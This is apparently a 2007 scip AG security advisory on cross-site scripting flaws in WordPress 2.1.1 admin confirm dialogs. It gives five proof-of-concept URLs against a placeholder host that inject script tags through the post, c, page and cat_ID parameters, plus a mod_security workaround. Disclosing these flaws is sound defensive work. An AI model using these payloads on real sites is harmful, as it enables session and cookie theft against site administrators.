Wordpress 2.1.1 - Multiple Script Injection Vulnerabilities

scip AG Vulnerability ID 2962 (02/27/2007)
http://www.scip.ch/cgi-bin/smss/showadvf.pl?id=2962

I. INTRODUCTION

"WordPress is a state-of-the-art semantic personal publishing platform 
with a focus on aesthetics, web standards, and usability."
More information is available on the project web site at the following URL:

     http://www.wordpress.org

II. DESCRIPTION

Stefan Friedli found several vulnerabilities based on an advisory 
entitled "WordPress AdminPanel CSRF/XSS - 0day" by "Samenspender" which 
described a lack of input validation when deleting posts that allows 
injection of arbitrary code. The vulnerability was reported on February, 
26th and is referenced in section VII.

Further to this vulnerability which was limited on manipulating the 
"post"-parameter, there are several other vulnerabilities which are very 
similar to the one mentioned above. Every operation that makes use of 
the common confirm-dialog is vulnerable for this type of attack.

Possible injection...

... when deleting posts as mentioned in Samenspenders advisory 
(unvalidated parameter: post, file: post.php)
http://target.tld/wp-admin/post.php?action=delete&post='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

... when deleting comments (unvalidated parameter: c, file: comment.php)
http://target.tld/wp-admin/comment.php?action=deletecomment&p=39&c='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

... when deleting pages (unvalidated parameter: page, file: page.php)
http://target.tld/wp-admin/page.php?action=delete&post='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

... when deleting categories (unvalidated parameter: cat_ID, file: 
categories.php)
http://target.tld/wp-admin/categories.php?action=delete&cat_ID='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

... when deleting comments (unvalidated parameter: c, file: comment.php)
http://target.tld/wp-admin/comment.php?action=deletecomment&p=35&c='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

IV. IMPACT

This list may not be exhaustive. It illustrated that the flaw with 
confirmation dialogs in Wordpress is not limited to the "Delete 
Post"-function. Fixing the validation of the post parameter as suggested 
by e.g. Secunia does not fix the problem and does not reduce the threat 
of cross-site-scripting or any other webbased exploitation.

V. DETECTION

This flaws can be detected by using any web browser.

VI. SOLUTION

Until these issues are patched, possible workarounds are manual fixing 
or the usage of a application level filter like mod_security for Apache.
